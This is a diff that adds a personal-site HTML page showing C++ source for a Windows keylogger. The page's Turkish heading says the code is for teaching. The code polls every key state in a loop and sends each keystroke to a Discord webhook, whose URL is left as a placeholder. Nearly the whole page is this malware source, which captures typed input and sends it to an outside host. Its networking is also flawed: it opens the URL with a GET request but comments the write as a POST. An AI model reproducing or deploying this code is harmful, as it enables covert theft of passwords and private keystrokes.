@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <title>Poor Mankind</title>
+    <link rel="stylesheet" href="cplus-keylogger.css">
+    <style>
+        html {
+            font-family: "Inter", sans-serif;
+            scroll-behavior: smooth;
+            height: 100%;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background-color: #101010;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+            align-items: center;
+            height: 100%;
+            margin: 0;
+            padding: 0;
+            overflow-x: hidden;
+        }
+
+        .game-description {
+            padding: 20px;
+            text-align: center;
+        }
+
+        .download-button {
+            margin-top: 20px;
+        }
+
+        .nav-bar {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #1a1b1e;
+            border-radius: 50px;
+            padding: 10px 20px;
+            opacity: 0.8;
+            display: flex;
+            justify-content: center;
+        }
+
+        .nav-bar ul {
+            list-style: none;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            gap: 20px;
+        }
+
+        .nav-bar ul li {
+            display: inline-block;
+        }
+
+        .nav-bar ul li a {
+            color: white;
+            text-decoration: none;
+            font-size: 1em;
+            padding: 10px 15px;
+            border-radius: 30px;
+            transition: background 0.3s;
+        }
+
+        .nav-bar ul li a:hover {
+            background: rgba(255, 255, 255, 0.2);
+        }
+
+        
+        .code-container {
+            width: 80%;
+            background-color: #2e2e2e;
+            color: #f8f8f2;
+            padding: 20px;
+            border-radius: 8px;
+            margin-top: 20px;
+            font-family: 'Courier New', Courier, monospace;
+            overflow-x: auto;
+            white-space: pre-wrap; 
+            word-wrap: break-word; 
+        }
+
+        .code-container pre {
+            margin: 0;
+            padding: 0;
+            font-size: 16px;
+            line-height: 1.6;
+        }
+
+        .code-container span {
+            color: #8a8a8a;
+            
+        }
+
+        .code-container .keyword {
+            color: #ff79c6;
+        }
+
+        .code-container .string {
+            color: #50fa7b;
+            
+        }
+
+        .code-container .function {
+            color: #8be9fd;
+            
+        }
+
+        .code-container .type {
+            color: #ffb86c;
+            
+        }
+
+        .code-container .number {
+            color: #bd93f9;
+            
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="game-description">
+        <div class="description">
+            <p style="font-size: 24px;">
+                Eğitici amaç ile yapılmış çok basit C++ 17 ile hazırlanmış bir keylogger
+            </p>
+        </div>
+    </div>
+
+    
+    <div class="code-container" style="margin-bottom: 150px;">
+        <pre>
+<span class="keyword">#include</span> <span class="string">&lt;iostream&gt;</span>
+<span class="keyword">#include</span> <span class="string">&lt;windows.h&gt;</span>
+<span class="keyword">#include</span> <span class="string">&lt;wininet.h&gt;</span>
+<span class="keyword">#include</span> <span class="string">&lt;string&gt;</span>
+<span class="keyword">#include</span> <span class="string">&lt;sstream&gt;</span>
+<span class="keyword">#include</span> <span class="string">&lt;iostream&gt;</span>
+
+<span class="keyword">using</span> namespace <span class="keyword">std</span>;
+
+<span class="keyword">// Discord Webhook</span>
+<span class="type">const</span> <span class="type">string</span> webhookUrl = <span class="string">"https://discord.com/api/webhooks/YOUR_WEBHOOK_URL"</span>;
+
+<span class="keyword">//Discord webhookuna gönderme</span>
+<span class="function">void</span> sendToDiscord(<span class="type">const</span> <span class="type">string</span>& message) {
+    HINTERNET hInternet, hConnect;
+    DWORD bytesWritten;
+
+    <span class="keyword">// WinINet</span>
+    hInternet = InternetOpen(L"Keylogger", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    <span class="keyword">if</span> (hInternet == NULL) {
+        <span class="keyword">return</span>;
+    }
+
+    <span class="keyword">// Discord bağlantı</span>
+    hConnect = InternetOpenUrlA(hInternet, webhookUrl.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
+    <span class="keyword">if</span> (hConnect == NULL) {
+        InternetCloseHandle(hInternet);
+        <span class="keyword">return</span>;
+    }
+
+    <span class="keyword">// JSON oluşturma</span>
+    stringstream jsonPayload;
+    jsonPayload &lt;&lt; <span class="string">"{ \"content\": \""</span> &lt;&lt; message &lt;&lt; <span class="string">"\" }"</span>;
+
+    <span class="keyword">// POST request</span>
+    InternetWriteFile(hConnect, jsonPayload.str().c_str(), jsonPayload.str().length(), &bytesWritten);
+
+    <span class="keyword">// Bağlantı kapama</span>
+    InternetCloseHandle(hConnect);
+    InternetCloseHandle(hInternet);
+}
+
+<span class="keyword">// Discord'a gönderme</span>
+<span class="function">void</span> logKey(int key) {
+    <span class="keyword">if</span> (key == 8) { <span class="keyword">// Backspace tuşu</span>
+        sendToDiscord(<span class="string">"[Backspace]"</span>);
+    } <span class="keyword">else if</span> (key == 13) { <span class="keyword">// Enter tuşu</span>
+        sendToDiscord(<span class="string">"[Enter]"</span>);
+    } <span class="keyword">else if</span> (key == 32) { <span class="keyword">// Boşluk tuşu</span>
+        sendToDiscord(<span class="string">" "</span>);
+    } <span class="keyword">else if</span> (key &gt;= 32 && key &lt;= 126) { <span class="keyword">// Yazılabilir ASCII karakterleri</span>
+        sendToDiscord(string(1, <span class="type">(char)</span>key));
+    }
+}
+
+<span class="function">int</span> main() {
+    <span class="keyword">while</span> (true) {
+        <span class="keyword">// 0x00 - 0xFF arasında tüm tuşlar kontrol</span>
+        <span class="keyword">for</span> (int key = 8; key &lt;= 190; key++) {
+            <span class="keyword">if</span> (GetAsyncKeyState(key) & 0x8000) {  <span class="keyword"></span>
+                logKey(key);  <span class="keyword">// gönderiliyor</span>
+                Sleep(10);  <span class="keyword"></span>
+            }
+        }
+    }
+
+    <span class="keyword">return</span> 0;
+}
+        </pre>
+    </div>
+
+   
+    <nav class="nav-bar">
+        <ul>
+            <li><a href="index.html">Home</a></li>
+            <li><a href="index.html#nav-Projects">Projects</a></li>
+            <li><a href="index.html#knowledge">Knowledge</a></li>
+            <li><a href="contact.html">Contact</a></li>
+        </ul>
+    </nav>
+
+</body>
+
+</html>
